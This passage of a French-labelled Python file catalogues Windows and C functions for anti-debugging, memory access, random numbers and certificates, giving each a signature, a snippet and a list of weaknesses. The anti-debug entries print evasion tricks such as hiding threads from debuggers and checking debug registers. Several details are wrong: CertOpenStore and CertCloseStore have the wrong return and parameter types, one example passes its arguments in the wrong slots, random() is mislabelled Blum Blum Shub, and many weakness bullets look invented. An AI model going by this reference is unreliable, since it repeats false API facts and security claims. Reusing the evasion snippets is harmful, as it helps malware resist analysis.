    'OutputDebugString': (
        '[color=blue][code]void WINAPI OutputDebugString(LPCTSTR lpOutputString);[/code][/color]\n'
        '[code]OutputDebugString("DBG_CHECK"); SetLastError(0); if(GetLastError() != 0) exit(1);[/code]\n'
        '[color=red]• Debugger string filtering\n• Exception suppression\n• OutputDebugString hook patching[/color]'
    ),

    'GetThreadContext': (
        '[color=blue][code]BOOL WINAPI GetThreadContext(HANDLE hThread, LPCONTEXT lpContext);[/code][/color]\n'
        '[code]CONTEXT ctx = {CONTEXT_DEBUG_REGISTERS}; GetThreadContext(hThread, &ctx); if(ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) exit(1);[/code]\n'
        '[color=red]• Hardware breakpoint emulation\n• Context structure hooking\n• DRx register spoofing[/color]'
    ),

    'SetUnhandledExceptionFilter': (
        '[color=blue][code]LPTOP_LEVEL_EXCEPTION_FILTER WINAPI SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);[/code][/color]\n'
        '[code]SetUnhandledExceptionFilter(MyHandler); *(int*)0 = 0; // Trigger exception[/code]\n'
        '[color=red]• VEH hooking priorité supérieure\n• Fake exception chain corruption\n• Debugger-specific exception handling[/color]'
    ),

    'UnhandledExceptionFilter': (
        '[color=blue][code]LONG WINAPI UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo);[/code][/color]\n'
        '[code]__try { *(int*)0 = 0; } __except(UnhandledExceptionFilter(GetExceptionInformation())) { }[/code]\n'
        '[color=red]• Exception code manipulation\n• Debugger response timing analysis\n• Nested exception loop detection[/color]'
    ),

    'CloseHandle': (
        '[color=blue][code]BOOL WINAPI CloseHandle(HANDLE hObject);[/code][/color]\n'
        '[code]CloseHandle((HANDLE)0xBADF00D); // Trigger exception if debugged[/code]\n'
        '[color=red]• Structured Exception Handling bypass\n• Invalid handle VEH hooking\n• Debugger crash-on-exception[/color]'
    ),

    'OpenProcess': (
        '[color=blue][code]HANDLE WINAPI OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);[/code][/color]\n'
        '[code]OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId()); // Anti-debug trick[/code]\n'
        '[color=red]• Process security descriptor modification\n• Handle privilege escalation\n• Protected process bypass[/color]'
    ),

    'TerminateProcess': (
        '[color=blue][code]BOOL WINAPI TerminateProcess(HANDLE hProcess, UINT uExitCode);[/code][/color]\n'
        '[code]TerminateProcess(GetCurrentProcess(), 0); // Unexpected exit if debugged[/code]\n'
        '[color=red]• Debugger post-mortem analysis bypass\n• Process kill chain detection\n• NtTerminateProcess hook[/color]'
    ),

    'DebugActiveProcess': (
        '[color=blue][code]BOOL WINAPI DebugActiveProcess(DWORD dwProcessId);[/code][/color]\n'
        '[code]DebugActiveProcess(target_pid); // Prevent multiple debuggers[/code]\n'
        '[color=red]• Debug object enumeration\n• ProcessDebugFlags manipulation\n• NtDebugActiveProcess hook[/color]'
    ),

    'DebugBreak': (
        '[color=blue][code]void WINAPI DebugBreak(void);[/code][/color]\n'
        '[code]DebugBreak(); // Trigger breakpoint exception[/code]\n'
        '[color=red]• Exception handler chain verification\n• Debugger response fingerprinting\n• INT3/DRx emulation[/color]'
    ),

    'ZwSetInformationThread': (
        '[color=blue][code]NTSTATUS NTAPI ZwSetInformationThread(HANDLE ThreadHandle, THREADINFOCLASS ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength);[/code][/color]\n'
        '[code]ZwSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, NULL, 0);[/code]\n'
        '[color=red]• ThreadHideFromDebugger bypass via ETHREAD inspection\n• Kernel-mode thread scanning\n• NtSetInformationThread hook[/color]'
    ),

    'NtQuerySystemInformation': (
        '[color=blue][code]NTSTATUS NTAPI NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);[/code][/color]\n'
        '[code]DWORD debugCount = 0; NtQuerySystemInformation(SystemProcessInformation, buffer, size, &ret);[/code]\n'
        '[color=red]• Direct kernel object manipulation (DKOM)\n• SystemInformationClass hook\n• Fake process environment block[/color]'
    ),

    'NtCreateThreadEx': (
        '[color=blue][code]NTSTATUS NTAPI NtCreateThreadEx(PHANDLE hThread, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID lpStartAddress, PVOID lpParameter, ULONG Flags, SIZE_T StackZeroBits, SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer);[/code][/color]\n'
        '[code]NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, startAddr, NULL, THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER, 0, 0, 0, NULL);[/code]\n'
        '[color=red]• Thread creation flag spoofing\n• Kernel thread enumeration\n• Debugger thread scan bypass[/color]'
    ),

    'NtGetContextThread': (
        '[color=blue][code]NTSTATUS NTAPI NtGetContextThread(HANDLE ThreadHandle, PCONTEXT pContext);[/code][/color]\n'
        '[code]NtGetContextThread(hThread, &ctx); if(ctx.EFlags & TRAP_FLAG) exit(1);[/code]\n'
        '[color=red]• Context structure hooking\n• Trap flag emulation\n• Single-step detection bypass[/color]'
    ),

    'NtContinue': (
        '[color=blue][code]NTSTATUS NTAPI NtContinue(PCONTEXT ContextRecord, BOOLEAN TestAlert);[/code][/color]\n'
        '[code]NtContinue(&ctx, FALSE); // Bypass debugger exception handling[/code]\n'
        '[color=red]• Exception chain poisoning\n• Context record validation bypass\n• Non-debugged process state restoration[/color]'
    ),

    'NtRaiseException': (
        '[color=blue][code]NTSTATUS NTAPI NtRaiseException(PEXCEPTION_RECORD ExceptionRecord, PCONTEXT ContextRecord, BOOLEAN FirstChance);[/code][/color]\n'
        '[code]NtRaiseException(&exRecord, &ctx, TRUE); // Custom exception flow[/code]\n'
        '[color=red]• Exception code fingerprinting\n• Debugger exception response analysis\n• Structured exception handling validation[/color]'
    ),

    'NtQueryObject': (
        '[color=blue][code]NTSTATUS NTAPI NtQueryObject(HANDLE Handle, OBJECT_INFORMATION_CLASS ObjectInformationClass, PVOID ObjectInformation, ULONG ObjectInformationLength, PULONG ReturnLength);[/code][/color]\n'
        '[code]NtQueryObject(hDebugObject, ObjectTypeInformation, buffer, size, &ret);[/code]\n'
        '[color=red]• Debug object type obfuscation\n• Handle table enumeration bypass\n• Object namespace hooking[/color]'
    ),

    'NtYieldExecution': (
        '[color=blue][code]NTSTATUS NTAPI NtYieldExecution(void);[/code][/color]\n'
        '[code]start = GetTickCount(); while(GetTickCount() - start < 1000) NtYieldExecution();[/code]\n'
        '[color=red]• Timing threshold detection\n• CPU cycle counter verification\n• Hypervisor-assisted timing[/color]'
    ),

    'NtQueryPerformanceCounter': (
        '[color=blue][code]NTSTATUS NTAPI NtQueryPerformanceCounter(PLARGE_INTEGER PerformanceCounter, PLARGE_INTEGER PerformanceFrequency);[/code][/color]\n'
        '[code]LARGE_INTEGER start, end; NtQueryPerformanceCounter(&start, NULL); SuspiciousOperation(); NtQueryPerformanceCounter(&end, NULL);[/code]\n'
        '[color=red]• QPC virtualization detection\n• Kernel-mode counter hook\n• TSC register validation[/color]'
    ),

    'GetModuleHandle': (
        '[color=blue][code]HMODULE WINAPI GetModuleHandle(LPCTSTR lpModuleName);[/code][/color]\n'
        '[code]if(GetModuleHandleA("scylla.dll") || GetModuleHandleA("x64dbg.exe")) exit(1);[/code]\n'
        '[color=red]• DLL hollowing\n• Module name randomization\n• In-memory signature scanning[/color]'
    )
}


all_memory_access_functions = { #FAIT
    'nom_du_dictionnaire': 'Toutes les fonctions d\'accès à la mémoire',
    'malloc': 'Alloue de la mémoire (non initialisée)',
    'calloc': 'Alloue et initialise de la mémoire à zéro',
    'realloc': 'Réalloue de la mémoire avec une nouvelle taille',
    'free': 'Libère de la mémoire allouée',
    'memcpy': 'Copie un bloc de mémoire',
    'memmove': 'Déplace un bloc de mémoire (gère le chevauchement)',
    'memset': 'Remplit un bloc de mémoire avec une valeur',
    'memchr': 'Recherche un caractère dans un bloc de mémoire',
    'memcmp': 'Compare deux blocs de mémoire',
    'aligned_alloc': 'Alloue de la mémoire alignée (C11)',
    'posix_memalign': 'Alloue de la mémoire alignée (POSIX)',
    'alloca': 'Alloue de la mémoire sur la pile (dangereux/déprécié)',
    'VirtualAlloc': 'Alloue de la mémoire virtuelle (Windows)',
    'VirtualFree': 'Libère de la mémoire virtuelle (Windows)',
    'VirtualProtect': 'Modifie les permissions de la mémoire virtuelle (Windows)',
    'ReadProcessMemory': 'Lit la mémoire d\'un processus distant (Windows)',
    'WriteProcessMemory': 'Écrit dans la mémoire d\'un processus distant (Windows)',
    'MapViewOfFile': 'Mappe un fichier en mémoire (Windows)',
    'UnmapViewOfFile': 'Démappe un fichier de la mémoire (Windows)',
    'CreateFileMapping': 'Crée un mappage de fichier (Windows)',
    'OpenFileMapping': 'Ouvre un mappage de fichier existant (Windows)',
    'mmap': 'Mappe un fichier/périphérique en mémoire (POSIX)',
    'munmap': 'Démappe une région de mémoire (POSIX)',
    'mprotect': 'Modifie les permissions d\'une région de mémoire (POSIX)',
    'mlock': 'Verrouille des pages en mémoire (empêche le swapping) (POSIX)',
    'munlock': 'Déverrouille des pages mémoire (POSIX)',
    'msync': 'Synchronise la mémoire mappée avec le fichier (POSIX)',
    'brk': 'Modifie la limite du segment de données (Linux)',
    'sbrk': 'Étend le segment de données (obsolète, Linux)',
    'shm_open': 'Ouvre un segment de mémoire partagée (POSIX)',
    'shm_unlink': 'Supprime un segment de mémoire partagée (POSIX)',
    'mincore': 'Vérifie si des pages sont en RAM (Linux)',
    'madvise': 'Donne des conseils d\'utilisation pour une région mémoire (Linux)',
    'malloc_usable_size': 'Retourne la taille réelle d\'un bloc alloué (GLIBC)',
    'malloc_stats': 'Affiche les statistiques d\'allocation (GLIBC)',
    'mtrace': 'Active le traçage des allocations (GLIBC)',
    'mcheck': 'Vérifie la cohérence du tas (heap) (GLIBC)',
    'memset_s': 'Remplit la mémoire avec vérification des bornes',
    'memcpy_s': 'Copie de la mémoire avec vérification des bornes',
    'valloc': 'Alloue de la mémoire alignée sur la page (obsolète)',
    'pvalloc': 'Alloue de la mémoire alignée sur la page (GLIBC)',
    'cfree': 'Libère de la mémoire (compatibilité historique)',
    'memfrob': 'Masque/démasque un bloc de mémoire (XOR avec 42) (GLIBC)',
    'explicit_bzero': 'Écrase la mémoire (pour éviter l\'optimisation)',
    '__atomic_load': 'Charge une valeur de manière atomique (GCC)',
    '__atomic_store': 'Stocke une valeur de manière atomique (GCC)',
    'mmap64': 'Mappe un fichier en mémoire (64-bit, GLIBC)',
    'memalign': 'Alloue de la mémoire alignée (obsolète, GLIBC)'
}

all_memory_access_functions_infos = {
    'nom_du_dictionnaire': '[color=red]Toutes les fonctions d\'accès à la mémoire identifiées[/color]',
    
    'malloc': (
        '[color=blue][code]void* malloc(size_t size);[/code][/color]\n'
        '[code]int *arr = (int*)malloc(100 * sizeof(int));[/code]\n'
        '[color=red]• Heap overflow via size miscalculation\n• Use-after-free\n• Double-free corruption[/color]'
    ),
    
    'calloc': (
        '[color=blue][code]void* calloc(size_t num, size_t size);[/code][/color]\n'
        '[code]int *zeros = (int*)calloc(10, sizeof(int));[/code]\n'
        '[color=red]• Integer overflow in num*size\n• False security from zero-init\n• Metadata corruption[/color]'
    ),

    'realloc': (
        '[color=blue][code]void* realloc(void *ptr, size_t size);[/code][/color]\n'
        '[code]ptr = realloc(ptr, new_size);[/code]\n'
        '[color=red]• Improper size adjustment\n• Memory disclosure on failure\n• Pointer invalidation races[/color]'
    ),

    'free': (
        '[color=blue][code]void free(void *ptr);[/code][/color]\n'
        '[code]free(ptr); ptr = NULL;[/code]\n'
        '[color=red]• Dangling pointers\n• Invalid pointer passing\n• Heap consolidation attacks[/color]'
    ),

    'memcpy': (
        '[color=blue][code]void* memcpy(void *dest, const void *src, size_t n);[/code][/color]\n'
        '[code]memcpy(buffer, input, user_controlled_size);[/code]\n'
        '[color=red]• Out-of-bounds copy primitive\n• Overlapping regions corruption\n• Bypass of FORTIFY_SOURCE[/color]'
    ),

    'memmove': (
        '[color=blue][code]void* memmove(void *dest, const void *src, size_t n);[/code][/color]\n'
        '[code]memmove(dest, src, len);[/code]\n'
        '[color=red]• Partial overlap data corruption\n• Size calculation errors\n• Metadata desynchronization[/color]'
    ),

    'memset': (
        '[color=blue][code]void* memset(void *s, int c, size_t n);[/code][/color]\n'
        '[code]memset(password, 0, sizeof(password));[/code]\n'
        '[color=red]• Sensitive data wiping bypass\n• Buffer under-initialization\n• Compiler optimization interference[/color]'
    ),

    'VirtualAlloc': (
        '[color=blue][code]LPVOID VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);[/code][/color]\n'
        '[code]void *addr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);[/code]\n'
        '[color=red]• RWX memory for shellcode\n• ASLR bypass via predictable addresses\n• Guard page bypass[/color]'
    ),

    'ReadProcessMemory': (
        '[color=blue][code]BOOL ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);[/code][/color]\n'
        '[code]ReadProcessMemory(hProc, 0x401000, buffer, 0x100, &read);[/code]\n'
        '[color=red]• ASLR/PIE bypass via memory scraping\n• Handle validation TOCTOU\n• Kernel address space probing[/color]'
    ),

    'mmap': (
        '[color=blue][code]void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);[/code][/color]\n'
        '[code]void *m = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS, -1, 0);[/code]\n'
        '[color=red]• Memory mapping side-channel attacks\n• File-backed TOCTOU\n• Virtual address space exhaustion[/color]'
    ),

    'mprotect': (
        '[color=blue][code]int mprotect(void *addr, size_t len, int prot);[/code][/color]\n'
        '[code]mprotect(addr, 0x1000, PROT_EXEC);[/code]\n'
        '[color=red]• W^X bypass via incremental changes\n• .got.plt section modification\n• VDSO manipulation[/color]'
    ),

    'alloca': (
        '[color=blue][code]void *alloca(size_t size);[/code][/color]\n'
        '[code]char *buf = alloca(user_input);[/code]\n'
        '[color=red]• Stack overflow via large size\n• Canary bypass via partial overwrite\n• Non-return address corruption[/color]'
    ),

    'memcpy_s': (
        '[color=blue][code]errno_t memcpy_s(void *dest, rsize_t destsz, const void *src, rsize_t count);[/code][/color]\n'
        '[code]memcpy_s(buffer, sizeof(buffer), input, len);[/code]\n'
        '[color=red]• Improper destsz validation\n• Size_t truncation\n• False security assumptions[/color]'
    ),

    'mlock': (
        '[color=blue][code]int mlock(const void *addr, size_t len);[/code][/color]\n'
        '[code]mlock(sensitive_data, data_len);[/code]\n'
        '[color=red]• Privilege escalation via RLIMIT_MEMLOCK\n• Physical memory exhaustion\n• Swap forensic remnant[/color]'
    ),

    'brk': (
        '[color=blue][code]int brk(void *addr);[/code][/color]\n'
        '[code]brk((void*)0x12340000);[/code]\n'
        '[color=red]• Heap layout manipulation\n• Uncontrolled memory expansion\n• Arena metadata corruption[/color]'
    ),

    'memfrob': (
        '[color=blue][code]void *memfrob(void *s, size_t n);[/code][/color]\n'
        '[code]memfrob(secret, strlen(secret));[/code]\n'
        '[color=red]• Weak XOR-based "encryption"\n• Known-key cipher attacks\n• False sense of data protection[/color]'
    ),

    'explicit_bzero': (
        '[color=blue][code]void explicit_bzero(void *s, size_t n);[/code][/color]\n'
        '[code]explicit_bzero(password, sizeof(password));[/code]\n'
        '[color=red]• Compiler optimization bypass\n• Memory remanence recovery\n• DMA attack surface[/color]'
    ),

    'shm_open': (
        '[color=blue][code]int shm_open(const char *name, int oflag, mode_t mode);[/code][/color]\n'
        '[code]int fd = shm_open("/myshm", O_CREAT|O_RDWR, 0600);[/code]\n'
        '[color=red]• Predictable SHM name attacks\n• Permission bypass via umask\n• /dev/shm symlink races[/color]'
    ),

    '__atomic_store': (
        '[color=blue][code]void __atomic_store(void *ptr, void *val, int memorder);[/code][/color]\n'
        '[code]__atomic_store(&shared_var, &new_val, __ATOMIC_RELEASE);[/code]\n'
        '[color=red]• Race condition exploitation\n• Memory ordering bypass\n• Tear-prone data types[/color]'
    ),

    'memalign': (
        '[color=blue][code]void *memalign(size_t alignment, size_t size);[/code][/color]\n'
        '[code]void *buf = memalign(16, 1024);[/code]\n'
        '[color=red]• Alignment-based side channels\n• Over-alignment memory waste\n• Arena fragmentation attacks[/color]'
    )
}
all_random_number_generation_functions = { #FAIT
    'nom_du_dictionnaire': 'Toutes les fonctions de génération de nombres aléatoires',
    'rand': 'Génère un nombre pseudo-aléatoire (non cryptographique)',
    'srand': 'Initialise le générateur pseudo-aléatoire (graine)',
    'drand48': 'Génère un nombre pseudo-aléatoire en virgule flottante (C standard)',
    'erand48': 'Génère un nombre pseudo-aléatoire avec état explicite (C standard)',
    'lrand48': 'Génère un entier long pseudo-aléatoire (C standard)',
    'srand48': 'Initialise le générateur drand48 (C standard)',
    'random': 'Génère un nombre pseudo-aléatoire amélioré (GLIBC)',
    'srandom': 'Initialise le générateur random() (GLIBC)',
    'initstate': 'Initialise un état de générateur aléatoire (POSIX)',
    'setstate': 'Change l\'état du générateur aléatoire (POSIX)',
    'getrandom': 'Récupère des octets aléatoires depuis le noyau (Linux 3.17+)',
    'getentropy': 'Récupère des octets aléatoires (OpenBSD, glibc 2.25+)',
    'arc4random': 'Génère un nombre aléatoire cryptographiquement sûr (BSD/macOS)',
    'arc4random_buf': 'Remplit un buffer avec des octets aléatoires (BSD/macOS)',
    'arc4random_uniform': 'Génère un nombre dans une plage uniforme (BSD/macOS)',
    'arc4random_stir': 'Réinitialise le générateur arc4random (BSD/macOS)',
    'CryptGenRandom': 'Génère des nombres aléatoires (API Cryptographique Windows, déprécié)',
    'BCryptGenRandom': 'Génère des nombres aléatoires (API CNG moderne, Windows)',
    'RtlGenRandom': 'Génère des nombres aléatoires (API bas niveau Windows)',
    'SystemFunction036': 'Alias de RtlGenRandom (Windows)',
    'RAND_bytes': 'Génère des octets aléatoires cryptographiques (OpenSSL)',
    'RAND_pseudo_bytes': 'Génère des octets pseudo-aléatoires (OpenSSL)',
    'randombytes_buf': 'Génère des octets aléatoires (libsodium/NaCl)',
    'randombytes_uniform': 'Génère un nombre dans une plage uniforme (libsodium)',
    'rdrand': 'Génère un nombre aléatoire via l\'instruction RDRAND (Intel/AMD)',
    'rdseed': 'Génère un nombre aléatoire via l\'instruction RDSEED (Intel/AMD)',
    'explicit_bzero': 'Écrase la mémoire (pour effacer les graines sensibles)',
    'memset_s': 'Remplit la mémoire avec vérification des bornes (C11 Annex K)',
    'rand_r': 'Version thread-safe de rand() (POSIX)',
    'std::random_device': 'Génère des nombres aléatoires matériels (C++11)',
    'java.security.SecureRandom': 'Génère des nombres cryptographiques (Java)',

}

all_random_number_generation_functions_infos = {
    'nom_du_dictionnaire': '[color=red]Fonctions de génération de nombres aléatoires identifiées[/color]',
    
    'rand': (
        '[color=blue][code]int rand(void);[/code][/color]\n'
        '[code]int x = rand() % 100;[/code]\n'
        '[color=red]• Predictable sequence via srand(time)\n• Modulo bias in value distribution\n• 32-bit state brute-forcible[/color]'
    ),
    
    'srand': (
        '[color=blue][code]void srand(unsigned int seed);[/code][/color]\n'
        '[code]srand(time(NULL));[/code]\n'
        '[color=red]• Seed guessing via timestamp/pid\n• Multiple instances correlation\n• Partial state initialization[/color]'
    ),

    'drand48': (
        '[color=blue][code]double drand48(void);[/code][/color]\n'
        '[code]double d = drand48();[/code]\n'
        '[color=red]• 48-bit state reversible in ~2^25 ops\n• Linear congruential algorithm flaws\n• Shared global state[/color]'
    ),

    'getrandom': (
        '[color=blue][code]ssize_t getrandom(void *buf, size_t buflen, unsigned int flags);[/code][/color]\n'
        '[code]unsigned char buf[32]; getrandom(buf, 32, GRND_RANDOM);[/code]\n'
        '[color=red]• Blocking behavior if low entropy\n• GRND_INSECURE bypass attempts\n• Early-boot predictability[/color]'
    ),

    'arc4random': (
        '[color=blue][code]uint32_t arc4random(void);[/code][/color]\n'
        '[code]uint32_t val = arc4random();[/code]\n'
        '[color=red]• Fork() safety on some implementations\n• VMA randomization bypass potential\n• Chacha20 key rotation timing[/color]'
    ),

    'BCryptGenRandom': (
        '[color=blue][code]NTSTATUS BCryptGenRandom(BCRYPT_ALG_HANDLE hAlgorithm, PUCHAR pbBuffer, ULONG cbBuffer, ULONG dwFlags);[/code][/color]\n'
        '[code]BCryptGenRandom(NULL, buf, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG);[/code]\n'
        '[color=red]• Improper handle usage errors\n• Mixing FIPS/NON-FIPS modes\n• TPM state extraction attacks[/color]'
    ),

    'RtlGenRandom': (
        '[color=blue][code]BOOLEAN RtlGenRandom(PVOID RandomBuffer, ULONG RandomBufferLength);[/code][/color]\n'
        '[code]BYTE buf[16]; RtlGenRandom(buf, sizeof(buf));[/code]\n'
        '[color=red]• Undocumented syscall dependencies\n• User-mode entropy poisoning\n• Virtualization detection bypass[/color]'
    ),

    'RAND_bytes': (
        '[color=blue][code]int RAND_bytes(unsigned char *buf, int num);[/code][/color]\n'
        '[code]RAND_bytes(key, 32);[/code]\n'
        '[color=red]• CSPRNG state fork() vulnerability\n• Debian weak seed historical issue\n• DRBG reseeding failures[/color]'
    ),

    'randombytes_buf': (
        '[color=blue][code]void randombytes_buf(void * const buf, const size_t size);[/code][/color]\n'
        '[code]randombytes_buf(nonce, 16);[/code]\n'
        '[color=red]• /dev/urandom vs getrandom() backend\n• Early-boot entropy starvation\n• VM snapshot state reuse[/color]'
    ),

    'rdrand': (
        '[color=blue][code]int _rdrand32_step(unsigned int *);[/code][/color]\n'
        '[code]unsigned int val; _rdrand32_step(&val);[/code]\n'
        '[color=red]• Hardware RNG backdoor concerns\n• CPU bug workaround bypass\n• RDRAND failure fallback handling[/color]'
    ),

    'explicit_bzero': (
        '[color=blue][code]void explicit_bzero(void *s, size_t n);[/code][/color]\n'
        '[code]explicit_bzero(key, sizeof(key));[/code]\n'
        '[color=red]• Compiler optimization interference\n• Memory remanence recovery\n• Hypervisor introspection[/color]'
    ),

    'std::random_device': (
        '[color=blue][code]class random_device; // C++11[/code][/color]\n'
        '[code]std::random_device rd; int x = rd();[/code]\n'
        '[color=red]• Deterministic on some compilers (MinGW)\n• Token-concat entropy source\n• Non-cryptographic guarantees[/color]'
    ),

    'java.security.SecureRandom': (
        '[color=blue][code]public class SecureRandom extends Random // Java[/code][/color]\n'
        '[code]SecureRandom random = new SecureRandom();[/code]\n'
        '[color=red]• SHA1PRNG seed reuse vulnerability\n• /dev/random blocking on Linux\n• Dual_EC_DRBG backdoor potential[/color]'
    ),

    'getentropy': (
        '[color=blue][code]int getentropy(void *buffer, size_t length);[/code][/color]\n'
        '[code]char buf[256]; getentropy(buf, sizeof(buf));[/code]\n'
        '[color=red]• Maximum 256 bytes per call\n• ENOSYS on older kernels\n• chroot/sandbox escape paths[/color]'
    ),

    'CryptGenRandom': (
        '[color=blue][code]BOOL CryptGenRandom(HCRYPTPROV hProv, DWORD dwLen, BYTE *pbBuffer);[/code][/color]\n'
        '[code]CryptGenRandom(hProv, 32, buffer);[/code]\n'
        '[color=red]• Deprecated CryptoAPI usage\n• Mixed entropy sources weakness\n• Process token impersonation[/color]'
    ),

    'rdseed': (
        '[color=blue][code]int _rdseed64_step(unsigned long long *);[/code][/color]\n'
        '[code]unsigned long long val; _rdseed64_step(&val);[/code]\n'
        '[color=red]• Low throughput in VMs\n• SEV-ES VM protection bypass\n• Entropy source validation[/color]'
    ),

    'random': (
        '[color=blue][code]long int random(void);[/code][/color]\n'
        '[code]long int r = random();[/code]\n'
        '[color=red]• 240-byte state buffer attacks\n• Non-cryptographic Blum Blum Shub\n• setstate() manipulation[/color]'
    )
}


all_certificate_management_functions = {#FAIT
    'nom_du_dictionnaire': 'Toutes les fonctions de gestion de certificats',
    'CertOpenStore': 'Ouvre un magasin de certificats (Windows)',
    'CertCloseStore': 'Ferme un magasin de certificats (Windows)',
    'CertEnumCertificatesInStore': 'Énumère les certificats dans un magasin (Windows)',
    'CertFindCertificateInStore': 'Recherche un certificat dans un magasin (Windows)',
    'CertAddCertificateContextToStore': 'Ajoute un certificat à un magasin (Windows)',
    'CertDeleteCertificateFromStore': 'Supprime un certificat d\'un magasin (Windows)',
    'CertGetCertificateChain': 'Construit une chaîne de certificats (Windows)',
    'CertVerifyRevocation': 'Vérifie la révocation d\'un certificat (Windows)',
    'CertGetNameString': 'Récupère le nom d\'un certificat (Windows)',
    'PFXImportCertStore': 'Importe un magasin de certificats PKCS#12 (Windows)',
    'CertCreateCertificateContext': 'Crée un contexte de certificat à partir de données brutes (Windows)',
    'CertFreeCertificateContext': 'Libère un contexte de certificat (Windows)',
    'CertSetCertificateContextProperty': 'Définit une propriété d\'un certificat (Windows)',
    'X509_STORE_new': 'Crée un nouveau magasin de certificats (OpenSSL)',
    'X509_STORE_free': 'Libère un magasin de certificats (OpenSSL)',
    'X509_STORE_add_cert': 'Ajoute un certificat à un magasin (OpenSSL)',
    'X509_STORE_add_crl': 'Ajoute une CRL (Liste de Révocation) à un magasin (OpenSSL)',
    'X509_STORE_get_by_subject': 'Recherche un certificat par sujet (OpenSSL)',
    'X509_new': 'Crée un objet X509 (OpenSSL)',
    'X509_free': 'Libère un objet X509 (OpenSSL)',
    'PEM_read_X509': 'Lit un certificat au format PEM (OpenSSL)',
    'd2i_X509': 'Décode un certificat au format DER (OpenSSL)',
    'X509_verify': 'Vérifie la signature d\'un certificat (OpenSSL)',
    'X509_check_private_key': 'Vérifie la correspondance clé privée/certificat (OpenSSL)',
    'SSL_CTX_load_verify_locations': 'Charge des certificats de confiance pour un contexte SSL (OpenSSL)',
    'CERT_DecodeCertFromPackage': 'Décode un certificat depuis des données brutes (NSS)',
    'PK11_FindCertFromNickname': 'Trouve un certificat par son surnom (NSS)',
    'CERT_ImportCerts': 'Importe des certificats dans un magasin (NSS)',
    'CERT_DestroyCertificate': 'Détruit un certificat (NSS)',
    'gnutls_certificate_set_x509_trust_file': 'Charge des certificats de confiance depuis un fichier (GnuTLS)',
    'gnutls_certificate_set_x509_key_file': 'Charge un certificat et sa clé privée (GnuTLS)',
    'gnutls_x509_crt_import': 'Importe un certificat X.509 (GnuTLS)',
    'PKCS12_parse': 'Extrait un certificat et une clé d\'un fichier PKCS#12 (OpenSSL)',
    'OCSP_cert_to_id': 'Génère un ID OCSP pour un certificat (OpenSSL)',
    'OCSP_check_validity': 'Vérifie la validité d\'une réponse OCSP (OpenSSL)',
    'CryptoAPI::CryptSignMessage': 'Signe un message avec un certificat (Windows)',
    'CertificateFactory.generateCertificate()': 'Génère un certificat depuis un flux (Java)',
    'X509Store.Open()': 'Ouvre un magasin de certificats (C#)',
    'X509Certificate2.Import()': 'Importe un certificat (C#)',
    'ssl.load_cert_chain()': 'Charge un certificat et une clé privée (Python)',
    'cryptography.x509.load_pem_x509_certificate()': 'Lit un certificat PEM (Python)'
}

all_certificate_management_functions_infos = {
    'nom_du_dictionnaire': 'Toutes les fonctions de gestion de certificats',
    'CertOpenStore': 'PCCERT_CONTEXT CertOpenStore(LPCSTR lpszStoreProvider, DWORD dwMsgAndCertEncodingType, HCRYPTPROV_LEGACY hCryptProv, DWORD dwFlags, const void *pvPara) [----] ex: CertOpenStore(CERT_STORE_PROV_SYSTEM, X509_ASN_ENCODING, NULL, CERT_SYSTEM_STORE_CURRENT_USER, L"MY") -> ouvre un magasin de certificats (Windows) [----] Vulns/Infos 1 : Mauvaise gestion des droits d\'accès au magasin peut permettre l\'accès non autorisé aux certificats [----] Vulns/Infos 2 : Une mauvaise gestion du contexte peut permettre la manipulation de certificats sensibles',

    'CertCloseStore': 'BOOL CertCloseStore(PCCERT_CONTEXT pCertContext, DWORD dwFlags) [----] ex: CertCloseStore(certContext, CERT_CLOSE_STORE_FORCE_FLAG) -> ferme un magasin de certificats (Windows) [----] Vulns/Infos 1 : Ne pas fermer un magasin après utilisation peut entraîner des fuites de mémoire ou une exposition des certificats [----] Vulns/Infos 2 : Une mauvaise gestion des erreurs peut laisser des ressources ouvertes ou corrompues',

    'CertFindCertificateInStore': 'PCCERT_CONTEXT CertFindCertificateInStore(HCERTSTORE hCertStore, DWORD dwCertEncodingType, DWORD dwFindFlags, DWORD dwFindType, const void *pvFindPara, PCCERT_CONTEXT pPrevCertContext) [----] ex: CertFindCertificateInStore(certStore, X509_ASN_ENCODING, CERT_FIND_SUBJECT_STR, CERT_KEY_PROV_INFO_PROP_ID, L"CertificatExemple", NULL) -> recherche un certificat dans un magasin (Windows) [----] Vulns/Infos 1 : Recherche non sécurisée dans un magasin peut exposer des informations sensibles [----] Vulns/Infos 2 : Mauvais paramétrage de la recherche peut conduire à des résultats erronés ou à l\'accès à des certificats incorrects',

    'CertAddCertificateContextToStore': 'BOOL CertAddCertificateContextToStore(HCERTSTORE hCertStore, PCCERT_CONTEXT pCertContext, DWORD dwAddDisposition, PCCERT_CONTEXT *ppPrevCertContext) [----] ex: CertAddCertificateContextToStore(certStore, certContext, CERT_STORE_ADD_REPLACE_EXISTING, NULL) -> ajoute un certificat à un magasin (Windows) [----] Vulns/Infos 1 : Ajouter un certificat dans un magasin sans vérification de sa validité peut entraîner des risques de sécurité [----] Vulns/Infos 2 : Mauvaise gestion des erreurs peut mener à l\'ajout non autorisé de certificats malveillants',

